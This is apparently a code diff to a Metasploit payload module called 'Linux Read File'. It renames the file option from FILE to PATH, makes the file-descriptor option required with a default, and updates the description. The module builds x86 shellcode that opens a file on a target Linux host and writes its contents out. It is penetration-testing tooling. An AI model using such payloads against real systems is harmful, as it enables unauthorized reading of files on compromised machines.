@@ -16,7 +16,7 @@ module Metasploit3
 		super(merge_info(info,
 			'Name'          => 'Linux Read File',
 			'Version'       => '',
-			'Description'   => 'Read a file from the local file system, and write it back out to the specified file descriptor',
+			'Description'   => 'Read up to 4096 bytes from the local file system and write it back out to the specified file descriptor',
 			'Author'        => 'hal',
 			'License'       => MSF_LICENSE,
 			'Platform'      => 'linux',
@@ -25,13 +25,13 @@ module Metasploit3
 		# Register exec options
 		register_options(
 			[
-				OptString.new('FILE',   [ true,  "The file to read" ]),
-				OptString.new('FD',     [ false,  "The file descriptor to write output to" ]),
+				OptString.new('PATH',   [ true,  "The file path to read" ]),
+				OptString.new('FD',     [ true,  "The file descriptor to write output to", 1 ]),
 			], self.class)
 	end
 
 	def generate_stage
-		fd = datastore['FD'] || 1
+		fd = datastore['FD']
 
 		payload_data =<<-EOS
 			jmp file
@@ -63,7 +63,7 @@ module Metasploit3
 
 			file:
 				call open
-				db "#{datastore['FILE']}", 0x00
+				db "#{datastore['PATH']}", 0x00
 		EOS
 
 		Metasm::Shellcode.assemble(Metasm::Ia32.new, payload_data).encode_string
